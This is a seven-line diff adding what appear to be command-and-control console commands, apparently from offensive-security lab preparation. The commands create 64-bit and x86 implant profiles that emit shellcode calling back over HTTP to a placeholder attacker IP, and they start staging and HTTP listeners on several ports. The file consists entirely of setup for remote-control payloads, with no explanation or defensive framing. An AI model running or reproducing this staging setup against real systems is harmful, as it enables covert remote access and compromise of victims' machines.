@@ -1,0 +1,7 @@
+profiles new --http {ATTACKER_IP}:8088 --format shellcode osep64
+stage-listener --url tcp://{ATTACKER_IP}:4443 --profile osep64
+http -L {ATTACKER_IP} --lport 8088
+
+profiles new --http {ATTACKER_IP}:9090 --format shellcode -a x86 osep86
+stage-listener --url tcp://{ATTACKER_IP}:5553 --profile osep86
+http -L {ATTACKER_IP} --lport 9090
